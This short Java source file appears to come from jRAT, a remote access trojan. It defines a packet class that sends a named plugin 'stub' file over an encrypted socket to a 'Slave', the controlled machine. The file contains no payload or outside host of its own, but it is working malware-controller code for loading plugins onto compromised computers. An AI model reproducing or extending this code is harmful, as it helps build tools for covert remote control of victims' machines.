package se.jrat.client.packets.outgoing;

import java.io.DataOutputStream;
import java.io.File;

import se.jrat.client.Slave;
import se.jrat.common.io.FileIO;

public class Packet101TransferPlugin extends AbstractOutgoingPacket {
	
	private String name;
	private File stub;
	
	public Packet101TransferPlugin(String name, File stub) {
		this.name = name;
		this.stub = stub;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(name);
		FileIO io = new FileIO();
		io.writeFile(stub, slave.getSocket(), slave.getDataOutputStream(), slave.getDataInputStream(), null, slave.getKey());
	}

	@Override
	public byte getPacketId() {
		return 101;
	}

}
